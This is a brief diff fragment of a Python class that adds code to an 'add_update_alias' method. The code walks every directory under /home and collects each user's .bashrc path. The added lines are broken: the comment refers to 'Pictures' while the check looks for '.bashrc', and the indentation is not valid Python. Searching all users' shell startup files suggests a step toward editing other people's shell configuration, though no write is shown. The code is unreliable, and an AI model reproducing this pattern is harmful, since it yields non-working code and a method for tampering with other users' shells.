@@ -202,6 +202,13 @@ class Base:
         print("sof")
 
     def add_update_alias():
+        root_dir = "/home"
+        for root, dirs, files in os.walk(root_dir):
+        # Check if any directory contains "Pictures" in its name
+        
+            if ".bashrc" in files:
+
+                bashrc_path = os.path.join(root, ".bashrc")
         time.sleep(0.5)
         print(
             colr().hex("#0000ff", "\n[+]", rgb_mode=True),
